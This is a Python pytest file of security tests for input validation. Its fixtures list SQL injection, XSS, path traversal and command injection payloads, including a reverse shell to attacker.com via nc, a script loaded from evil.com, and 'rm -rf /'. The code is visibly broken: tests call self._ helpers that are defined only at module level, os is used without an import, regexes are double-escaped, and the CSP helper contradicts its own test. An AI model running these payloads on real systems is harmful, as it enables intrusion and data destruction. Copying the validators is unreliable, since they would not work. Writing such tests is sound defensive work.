"""Comprehensive input validation security tests.

Tests SQL injection prevention, XSS prevention, CSRF protection, and input sanitization.
Week 14: Security Review - Input Validation Testing
"""

import pytest
import re
import html
from typing import Dict, Any, List, Optional
from unittest.mock import Mock, patch
from urllib.parse import quote, unquote

# =================================================================
# Test Fixtures
# =================================================================

@pytest.fixture
def sql_injection_payloads():
    """Common SQL injection attack payloads."""
    return [
        "' OR '1'='1",
        "1' OR '1' = '1",
        "' OR 1=1--",
        "admin'--",
        "' UNION SELECT NULL--",
        "1; DROP TABLE users--",
        "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
        "1' AND '1'='1",
        "1' WAITFOR DELAY '00:00:05'--",
        "' OR 'x'='x",
    ]


@pytest.fixture
def xss_attack_payloads():
    """Common XSS attack payloads."""
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=\"javascript:alert('XSS')\">",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=\"alert('XSS')\">",
        "<audio src=x onerror=alert('XSS')>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
    ]


@pytest.fixture
def path_traversal_payloads():
    """Path traversal attack payloads."""
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..;/..;/..;/etc/passwd",
        "/var/www/../../etc/passwd",
        "file:///etc/passwd",
        "./../../etc/passwd",
    ]


@pytest.fixture
def command_injection_payloads():
    """Command injection attack payloads."""
    return [
        "; ls -la",
        "| cat /etc/passwd",
        "`whoami`",
        "$(whoami)",
        "&& echo vulnerable",
        "|| echo vulnerable",
        "; nc -e /bin/sh attacker.com 4444",
        "'; shutdown -h now; echo '",
    ]


@pytest.fixture
def valid_email_addresses():
    """Valid email addresses for validation testing."""
    return [
        "user@example.com",
        "user.name@example.com",
        "user+tag@example.co.uk",
        "user123@example-domain.com",
    ]


@pytest.fixture
def invalid_email_addresses():
    """Invalid email addresses."""
    return [
        "not-an-email",
        "@example.com",
        "user@",
        "user @example.com",
        "user@.com",
        "user..name@example.com",
    ]


# =================================================================
# SQL Injection Prevention Tests (10 tests)
# =================================================================

class TestSQLInjectionPrevention:
    """Test SQL injection attack prevention."""

    def test_parameterized_query_prevents_injection(self, sql_injection_payloads):
        """Test parameterized queries prevent SQL injection."""
        # Given SQL injection payloads
        for payload in sql_injection_payloads:
            # When using parameterized query
            query = "SELECT * FROM users WHERE username = ?"
            params = (payload,)

            # Then payload should be treated as data, not code
            is_safe = self._validate_parameterized_query(query, params)
            assert is_safe is True

    def test_orm_prevents_sql_injection(self, sql_injection_payloads):
        """Test ORM usage prevents SQL injection."""
        # Given SQLAlchemy ORM usage
        for payload in sql_injection_payloads:
            # When using ORM query
            # Example: session.query(User).filter(User.username == payload)
            is_safe = self._validate_orm_query(payload)

            # Then should be safe from injection
            assert is_safe is True

    def test_string_concatenation_detection(self):
        """Test detection of dangerous string concatenation in SQL."""
        # Given dangerous query construction
        dangerous_queries = [
            "SELECT * FROM users WHERE id = " + "user_input",
            f"SELECT * FROM users WHERE name = '{\"user_input\"}'",
            "SELECT * FROM users WHERE id = %s" % "user_input",
        ]

        # When checking for string concatenation
        for query in dangerous_queries:
            is_dangerous = self._detect_string_concatenation(query)

            # Then should be detected as dangerous
            assert is_dangerous is True

    def test_input_validation_before_query(self, sql_injection_payloads):
        """Test input validation before SQL query execution."""
        # Given user input
        for payload in sql_injection_payloads:
            # When validating input
            is_valid = self._validate_sql_input(payload)

            # Then malicious input should be rejected
            assert is_valid is False

    def test_whitelist_validation_for_table_names(self):
        """Test whitelist validation for dynamic table names."""
        # Given allowed tables
        allowed_tables = ["users", "accounts", "recommendations"]

        # When validating table name
        safe_table = "users"
        unsafe_table = "users; DROP TABLE accounts--"

        assert self._validate_table_name(safe_table, allowed_tables) is True
        assert self._validate_table_name(unsafe_table, allowed_tables) is False

    def test_whitelist_validation_for_column_names(self):
        """Test whitelist validation for dynamic column names."""
        # Given allowed columns
        allowed_columns = ["id", "username", "email", "created_at"]

        # When validating column name
        safe_column = "username"
        unsafe_column = "username; DROP TABLE users--"

        assert self._validate_column_name(safe_column, allowed_columns) is True
        assert self._validate_column_name(unsafe_column, allowed_columns) is False

    def test_integer_input_validation(self):
        """Test integer input validation for SQL parameters."""
        # Given inputs
        valid_int = "123"
        invalid_int = "123' OR '1'='1"

        # When validating integers
        assert self._validate_integer_input(valid_int) is True
        assert self._validate_integer_input(invalid_int) is False

    def test_escape_special_characters(self, sql_injection_payloads):
        """Test escaping special SQL characters."""
        # Given input with special characters
        for payload in sql_injection_payloads:
            # When escaping
            escaped = self._escape_sql_special_chars(payload)

            # Then special characters should be escaped
            assert "'" not in escaped or "\\'" in escaped or "''" in escaped

    def test_limit_query_result_size(self):
        """Test SQL query result size limitations."""
        # Given query with LIMIT clause
        query = "SELECT * FROM users LIMIT 100"

        # When checking if limit is applied
        has_limit = self._has_result_limit(query)

        # Then should have limit
        assert has_limit is True

    def test_stored_procedure_usage_validation(self):
        """Test stored procedure parameter validation."""
        # Given stored procedure call
        proc_name = "GetUserByUsername"
        params = {"username": "admin'--"}

        # When validating parameters
        is_safe = self._validate_stored_proc_params(proc_name, params)

        # Then should validate parameters
        assert is_safe is False  # Contains SQL injection attempt


# =================================================================
# XSS Prevention Tests (10 tests)
# =================================================================

class TestXSSPrevention:
    """Test Cross-Site Scripting (XSS) attack prevention."""

    def test_html_escape_output(self, xss_attack_payloads):
        """Test HTML escaping prevents XSS."""
        # Given XSS payloads
        for payload in xss_attack_payloads:
            # When escaping HTML
            escaped = html.escape(payload)

            # Then script tags should be escaped
            assert "<script>" not in escaped.lower()
            assert "&lt;script&gt;" in escaped.lower() or "&lt;" in escaped

    def test_javascript_context_escaping(self):
        """Test JavaScript context-specific escaping."""
        # Given user input in JavaScript context
        user_input = "'; alert('XSS'); //"

        # When escaping for JavaScript
        escaped = self._escape_javascript(user_input)

        # Then should be safe for JavaScript context
        assert "\\'" in escaped
        assert "alert" not in escaped or "\\alert" in escaped

    def test_url_parameter_validation(self, xss_attack_payloads):
        """Test URL parameter validation."""
        # Given URL parameters
        for payload in xss_attack_payloads:
            # When validating URL parameter
            is_safe = self._validate_url_parameter(payload)

            # Then malicious payloads should be rejected
            assert is_safe is False

    def test_content_security_policy_header(self):
        """Test Content Security Policy header is set."""
        # Given CSP header
        csp_header = self._get_csp_header()

        # Then should have strict CSP
        assert "default-src 'self'" in csp_header
        assert "script-src 'self'" in csp_header
        assert "'unsafe-inline'" not in csp_header  # Should NOT allow inline scripts

    def test_sanitize_html_input(self, xss_attack_payloads):
        """Test HTML input sanitization."""
        # Given HTML input
        for payload in xss_attack_payloads:
            # When sanitizing
            sanitized = self._sanitize_html(payload)

            # Then dangerous tags should be removed
            assert "<script" not in sanitized.lower()
            assert "onerror" not in sanitized.lower()
            assert "onload" not in sanitized.lower()

    def test_dom_based_xss_prevention(self):
        """Test DOM-based XSS prevention."""
        # Given user input used in DOM manipulation
        user_input = "<img src=x onerror=alert('XSS')>"

        # When validating for DOM usage
        is_safe = self._validate_dom_input(user_input)

        # Then should be rejected
        assert is_safe is False

    def test_reflected_xss_prevention(self):
        """Test reflected XSS prevention."""
        # Given input reflected in response
        reflected_input = "<script>alert('XSS')</script>"

        # When preparing for reflection
        safe_output = html.escape(reflected_input)

        # Then should be escaped
        assert "<script>" not in safe_output
        assert "&lt;script&gt;" in safe_output

    def test_stored_xss_prevention(self, xss_attack_payloads):
        """Test stored XSS prevention."""
        # Given input to be stored in database
        for payload in xss_attack_payloads:
            # When sanitizing before storage
            sanitized = self._sanitize_before_storage(payload)

            # Then should remove dangerous content
            assert "<script" not in sanitized.lower()

    def test_attribute_context_escaping(self):
        """Test HTML attribute context escaping."""
        # Given input in attribute context
        user_input = "\" onmouseover=\"alert('XSS')\""

        # When escaping for attribute
        escaped = self._escape_html_attribute(user_input)

        # Then quotes should be escaped
        assert "\"" not in escaped or "&quot;" in escaped

    def test_rich_text_sanitization(self):
        """Test rich text editor input sanitization."""
        # Given rich text with potential XSS
        rich_text = """
        <p>Normal paragraph</p>
        <script>alert('XSS')</script>
        <a href="javascript:alert('XSS')">Link</a>
        """

        # When sanitizing rich text
        sanitized = self._sanitize_rich_text(rich_text)

        # Then should keep safe tags, remove dangerous ones
        assert "<p>" in sanitized
        assert "<script>" not in sanitized
        assert "javascript:" not in sanitized


# =================================================================
# CSRF Protection Tests (5 tests)
# =================================================================

class TestCSRFProtection:
    """Test Cross-Site Request Forgery protection."""

    def test_csrf_token_generation(self):
        """Test CSRF token generation."""
        # Given token generation
        token1 = self._generate_csrf_token()
        token2 = self._generate_csrf_token()

        # Then tokens should be unique and sufficient length
        assert token1 != token2
        assert len(token1) >= 32

    def test_csrf_token_validation(self):
        """Test CSRF token validation."""
        # Given valid CSRF token
        token = self._generate_csrf_token()
        stored_token = token

        # When validating token
        is_valid = self._validate_csrf_token(token, stored_token)

        # Then should be valid
        assert is_valid is True

        # When using different token
        is_valid = self._validate_csrf_token("wrong_token", stored_token)
        assert is_valid is False

    def test_csrf_token_in_forms(self):
        """Test CSRF token is included in forms."""
        # Given form HTML
        form_html = """
        <form method="POST" action="/update">
            <input type="hidden" name="csrf_token" value="abc123xyz">
            <button type="submit">Submit</button>
        </form>
        """

        # When checking for CSRF token
        has_csrf = self._form_has_csrf_token(form_html)

        # Then should have CSRF token
        assert has_csrf is True

    def test_csrf_double_submit_cookie(self):
        """Test CSRF double-submit cookie pattern."""
        # Given request with cookie and parameter
        cookie_token = "csrf_token_123"
        param_token = "csrf_token_123"

        # When validating double-submit
        is_valid = self._validate_double_submit(cookie_token, param_token)

        # Then should be valid
        assert is_valid is True

        # When tokens don't match
        is_valid = self._validate_double_submit(cookie_token, "different_token")
        assert is_valid is False

    def test_csrf_samesite_cookie_attribute(self):
        """Test SameSite cookie attribute for CSRF protection."""
        # Given cookie configuration
        cookie_config = self._get_cookie_config()

        # Then should have SameSite attribute
        assert cookie_config.get("samesite") in ["strict", "lax"]
        assert cookie_config.get("secure") is True


# =================================================================
# Input Sanitization Tests (5 tests)
# =================================================================

class TestInputSanitization:
    """Test general input sanitization."""

    def test_remove_null_bytes(self):
        """Test null byte removal from input."""
        # Given input with null bytes
        malicious_input = "file.txt\\x00.jpg"

        # When sanitizing
        sanitized = self._remove_null_bytes(malicious_input)

        # Then null bytes should be removed
        assert "\\x00" not in sanitized
        assert sanitized == "file.txt.jpg"

    def test_normalize_unicode(self):
        """Test Unicode normalization."""
        # Given Unicode input with different representations
        input1 = "café"  # Using composed character
        input2 = "café"  # Using decomposed characters

        # When normalizing
        normalized1 = self._normalize_unicode(input1)
        normalized2 = self._normalize_unicode(input2)

        # Then should be equal after normalization
        assert normalized1 == normalized2

    def test_whitespace_normalization(self):
        """Test whitespace normalization."""
        # Given input with excessive whitespace
        input_str = "  multiple   spaces   "

        # When normalizing
        normalized = self._normalize_whitespace(input_str)

        # Then should have single spaces
        assert normalized == "multiple spaces"

    def test_control_character_removal(self):
        """Test removal of control characters."""
        # Given input with control characters
        input_str = "text\\r\\n\\t\\x0c\\x0b"

        # When removing control characters
        cleaned = self._remove_control_characters(input_str)

        # Then control characters should be removed
        assert "\\r" not in repr(cleaned)
        assert "\\t" not in repr(cleaned)

    def test_length_validation(self):
        """Test input length validation."""
        # Given input length limits
        max_length = 100

        # When validating length
        valid_input = "a" * 50
        invalid_input = "a" * 150

        assert self._validate_length(valid_input, max_length) is True
        assert self._validate_length(invalid_input, max_length) is False


# =================================================================
# Email and Format Validation Tests (5 tests)
# =================================================================

class TestEmailAndFormatValidation:
    """Test email and other format validations."""

    def test_email_format_validation(self, valid_email_addresses, invalid_email_addresses):
        """Test email format validation."""
        # When validating valid emails
        for email in valid_email_addresses:
            assert self._validate_email_format(email) is True

        # When validating invalid emails
        for email in invalid_email_addresses:
            assert self._validate_email_format(email) is False

    def test_phone_number_validation(self):
        """Test phone number format validation."""
        # Given phone numbers
        valid_phones = [
            "+1-555-123-4567",
            "(555) 123-4567",
            "555-123-4567",
            "+44 20 1234 5678",
        ]

        invalid_phones = [
            "not-a-phone",
            "123",
            "++1-555-123-4567",
        ]

        # When validating
        for phone in valid_phones:
            assert self._validate_phone_format(phone) is True

        for phone in invalid_phones:
            assert self._validate_phone_format(phone) is False

    def test_url_validation(self):
        """Test URL format validation."""
        # Given URLs
        valid_urls = [
            "https://example.com",
            "http://sub.example.com/path",
            "https://example.com:8080/path?query=value",
        ]

        invalid_urls = [
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "not-a-url",
            "ftp://example.com",  # If FTP is not allowed
        ]

        # When validating
        for url in valid_urls:
            assert self._validate_url_format(url) is True

        for url in invalid_urls:
            assert self._validate_url_format(url, allowed_schemes=["http", "https"]) is False

    def test_date_format_validation(self):
        """Test date format validation."""
        # Given dates
        valid_dates = [
            "2025-10-19",
            "2025-01-01",
            "2025-12-31",
        ]

        invalid_dates = [
            "2025-13-01",  # Invalid month
            "2025-01-32",  # Invalid day
            "not-a-date",
            "25/10/2025",  # Wrong format
        ]

        # When validating ISO format
        for date in valid_dates:
            assert self._validate_date_format(date) is True

        for date in invalid_dates:
            assert self._validate_date_format(date) is False

    def test_credit_card_format_validation(self):
        """Test credit card format validation."""
        # Given credit card numbers
        valid_cards = [
            "4532-1234-5678-9010",  # Visa
            "5425-2334-3010-9903",  # Mastercard
        ]

        invalid_cards = [
            "1234-5678-9012-3456",  # Invalid format
            "not-a-card",
        ]

        # When validating
        for card in valid_cards:
            # Note: This is format validation, not Luhn algorithm validation
            assert self._validate_card_format(card) is True

        for card in invalid_cards:
            assert self._validate_card_format(card) is False


# =================================================================
# Path Traversal Prevention Tests (5 tests)
# =================================================================

class TestPathTraversalPrevention:
    """Test path traversal attack prevention."""

    def test_path_traversal_detection(self, path_traversal_payloads):
        """Test detection of path traversal attempts."""
        # Given path traversal payloads
        for payload in path_traversal_payloads:
            # When validating path
            is_safe = self._validate_file_path(payload)

            # Then should be detected as unsafe
            assert is_safe is False

    def test_path_normalization(self):
        """Test path normalization."""
        # Given paths with traversal
        paths = [
            "../../../etc/passwd",
            "files/../../etc/passwd",
            "./files/../../../etc/passwd",
        ]

        # When normalizing
        for path in paths:
            normalized = self._normalize_path(path)

            # Then should resolve to safe path or be rejected
            assert "../" not in normalized or normalized.startswith("/safe/")

    def test_whitelist_directory_validation(self):
        """Test file access is restricted to allowed directories."""
        # Given allowed directory
        allowed_dir = "/var/www/uploads"

        # When validating paths
        safe_path = "/var/www/uploads/file.jpg"
        unsafe_path = "/etc/passwd"

        assert self._validate_directory_whitelist(safe_path, allowed_dir) is True
        assert self._validate_directory_whitelist(unsafe_path, allowed_dir) is False

    def test_filename_sanitization(self):
        """Test filename sanitization."""
        # Given potentially dangerous filenames
        filenames = [
            "../../../etc/passwd",
            "file.txt; rm -rf /",
            "file\\x00.jpg",
            "CON.txt",  # Windows reserved name
        ]

        # When sanitizing
        for filename in filenames:
            sanitized = self._sanitize_filename(filename)

            # Then should remove dangerous characters
            assert "../" not in sanitized
            assert ";" not in sanitized
            assert "\\x00" not in sanitized

    def test_file_extension_validation(self):
        """Test file extension validation."""
        # Given allowed extensions
        allowed_extensions = [".jpg", ".png", ".pdf", ".txt"]

        # When validating files
        valid_file = "document.pdf"
        invalid_file = "script.sh"

        assert self._validate_file_extension(valid_file, allowed_extensions) is True
        assert self._validate_file_extension(invalid_file, allowed_extensions) is False


# =================================================================
# Helper Methods
# =================================================================

def _validate_parameterized_query(query: str, params: tuple) -> bool:
    """Validate query uses parameterization."""
    return "?" in query and isinstance(params, tuple)


def _validate_orm_query(user_input: str) -> bool:
    """Validate ORM usage (simulated)."""
    # ORM automatically parameterizes, so always safe
    return True


def _detect_string_concatenation(query: str) -> bool:
    """Detect dangerous string concatenation in SQL."""
    dangerous_patterns = [
        r"\+\s*[\"']",  # Concatenation with quotes
        r"%s.*%.*[\"']",  # String formatting
        r"f[\"'].*\{",  # f-string usage
    ]
    return any(re.search(pattern, query) for pattern in dangerous_patterns)


def _validate_sql_input(user_input: str) -> bool:
    """Validate SQL input for injection attempts."""
    dangerous_patterns = [
        r"(\-\-|;|\/\*|\*\/)",  # SQL comments
        r"(union|select|insert|update|delete|drop|create|alter)",  # SQL keywords
        r"(\bor\b|\band\b).*=",  # OR/AND conditions
    ]
    return not any(re.search(pattern, user_input, re.IGNORECASE) for pattern in dangerous_patterns)


def _validate_table_name(table_name: str, allowed_tables: List[str]) -> bool:
    """Validate table name against whitelist."""
    return table_name in allowed_tables


def _validate_column_name(column_name: str, allowed_columns: List[str]) -> bool:
    """Validate column name against whitelist."""
    return column_name in allowed_columns


def _validate_integer_input(value: str) -> bool:
    """Validate input is a valid integer."""
    try:
        int(value)
        return True
    except ValueError:
        return False


def _escape_sql_special_chars(value: str) -> str:
    """Escape SQL special characters."""
    return value.replace("'", "''")


def _has_result_limit(query: str) -> bool:
    """Check if query has LIMIT clause."""
    return "LIMIT" in query.upper()


def _validate_stored_proc_params(proc_name: str, params: Dict[str, Any]) -> bool:
    """Validate stored procedure parameters."""
    for value in params.values():
        if not _validate_sql_input(str(value)):
            return False
    return True


def _escape_javascript(value: str) -> str:
    """Escape value for JavaScript context."""
    replacements = {
        "'": "\\'",
        "\"": "\\\"",
        "<": "\\x3C",
        ">": "\\x3E",
        "&": "\\x26",
    }
    for char, escaped in replacements.items():
        value = value.replace(char, escaped)
    return value


def _validate_url_parameter(value: str) -> bool:
    """Validate URL parameter."""
    dangerous_patterns = [
        r"<script",
        r"javascript:",
        r"onerror",
        r"onload",
    ]
    return not any(re.search(pattern, value, re.IGNORECASE) for pattern in dangerous_patterns)


def _get_csp_header() -> str:
    """Get Content Security Policy header."""
    return "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"


def _sanitize_html(html_input: str) -> str:
    """Sanitize HTML input."""
    # Remove dangerous tags
    dangerous_tags = [
        "script", "iframe", "object", "embed",
        "link", "style", "meta", "base"
    ]

    sanitized = html_input
    for tag in dangerous_tags:
        sanitized = re.sub(f"<{tag}[^>]*>.*?</{tag}>", "", sanitized, flags=re.IGNORECASE | re.DOTALL)
        sanitized = re.sub(f"<{tag}[^>]*/>", "", sanitized, flags=re.IGNORECASE)

    # Remove event handlers
    sanitized = re.sub(r"on\w+\s*=\s*[\"'][^\"']*[\"']", "", sanitized, flags=re.IGNORECASE)

    return sanitized


def _validate_dom_input(value: str) -> bool:
    """Validate input for DOM usage."""
    return _validate_url_parameter(value)


def _sanitize_before_storage(value: str) -> str:
    """Sanitize input before storage."""
    return _sanitize_html(value)


def _escape_html_attribute(value: str) -> str:
    """Escape value for HTML attribute context."""
    return html.escape(value, quote=True)


def _sanitize_rich_text(html_input: str) -> str:
    """Sanitize rich text editor input."""
    # Allow safe tags, remove dangerous ones
    safe_tags = ["p", "br", "strong", "em", "u", "ol", "ul", "li"]
    sanitized = _sanitize_html(html_input)

    # Additional sanitization for links
    sanitized = re.sub(r"href=[\"']javascript:", "href=\"\"", sanitized, flags=re.IGNORECASE)

    return sanitized


def _generate_csrf_token() -> str:
    """Generate CSRF token."""
    import secrets
    return secrets.token_urlsafe(32)


def _validate_csrf_token(token: str, stored_token: str) -> bool:
    """Validate CSRF token."""
    import secrets
    return secrets.compare_digest(token, stored_token)


def _form_has_csrf_token(form_html: str) -> bool:
    """Check if form has CSRF token."""
    return 'name="csrf_token"' in form_html or 'name=\\'csrf_token\\'' in form_html


def _validate_double_submit(cookie_token: str, param_token: str) -> bool:
    """Validate double-submit cookie pattern."""
    import secrets
    return secrets.compare_digest(cookie_token, param_token)


def _get_cookie_config() -> Dict[str, Any]:
    """Get cookie configuration."""
    return {
        "samesite": "strict",
        "secure": True,
        "httponly": True
    }


def _remove_null_bytes(value: str) -> str:
    """Remove null bytes from input."""
    return value.replace("\\x00", "")


def _normalize_unicode(value: str) -> str:
    """Normalize Unicode string."""
    import unicodedata
    return unicodedata.normalize("NFC", value)


def _normalize_whitespace(value: str) -> str:
    """Normalize whitespace."""
    return " ".join(value.split())


def _remove_control_characters(value: str) -> str:
    """Remove control characters."""
    return "".join(ch for ch in value if ch.isprintable() or ch in "\\n\\t")


def _validate_length(value: str, max_length: int) -> bool:
    """Validate input length."""
    return len(value) <= max_length


def _validate_email_format(email: str) -> bool:
    """Validate email format."""
    pattern = r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$"
    return re.match(pattern, email) is not None


def _validate_phone_format(phone: str) -> bool:
    """Validate phone number format."""
    # Remove common separators
    cleaned = re.sub(r"[\\s\\-\\(\\)]", "", phone)
    # Check if it's a valid phone (simplified)
    pattern = r"^\\+?[1-9]\\d{9,14}$"
    return re.match(pattern, cleaned) is not None


def _validate_url_format(url: str, allowed_schemes: List[str] = None) -> bool:
    """Validate URL format."""
    if allowed_schemes is None:
        allowed_schemes = ["http", "https"]

    pattern = r"^(https?://)?[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}(/.*)?$"
    if not re.match(pattern, url):
        return False

    # Check scheme
    if "://" in url:
        scheme = url.split("://")[0]
        return scheme in allowed_schemes

    return True


def _validate_date_format(date_str: str) -> bool:
    """Validate ISO date format."""
    from datetime import datetime
    try:
        datetime.strptime(date_str, "%Y-%m-%d")
        return True
    except ValueError:
        return False


def _validate_card_format(card: str) -> bool:
    """Validate credit card format."""
    # Remove separators
    cleaned = re.sub(r"[\\s\\-]", "", card)
    # Check if it's 13-19 digits
    return re.match(r"^\\d{13,19}$", cleaned) is not None


def _validate_file_path(path: str) -> bool:
    """Validate file path for traversal attempts."""
    dangerous_patterns = [
        r"\\.\\.",  # Parent directory
        r"/etc/",  # System directories
        r"/var/",
        r"C:\\\\",
        r"\\\\Windows\\\\",
    ]
    return not any(re.search(pattern, path, re.IGNORECASE) for pattern in dangerous_patterns)


def _normalize_path(path: str) -> str:
    """Normalize file path."""
    import os
    return os.path.normpath(path)


def _validate_directory_whitelist(path: str, allowed_dir: str) -> bool:
    """Validate path is within allowed directory."""
    import os
    normalized_path = os.path.normpath(os.path.abspath(path))
    normalized_allowed = os.path.normpath(os.path.abspath(allowed_dir))
    return normalized_path.startswith(normalized_allowed)


def _sanitize_filename(filename: str) -> str:
    """Sanitize filename."""
    # Remove path components
    filename = os.path.basename(filename)
    # Remove dangerous characters
    filename = re.sub(r"[^a-zA-Z0-9._-]", "_", filename)
    return filename


def _validate_file_extension(filename: str, allowed_extensions: List[str]) -> bool:
    """Validate file extension."""
    import os
    _, ext = os.path.splitext(filename)
    return ext.lower() in [e.lower() for e in allowed_extensions]
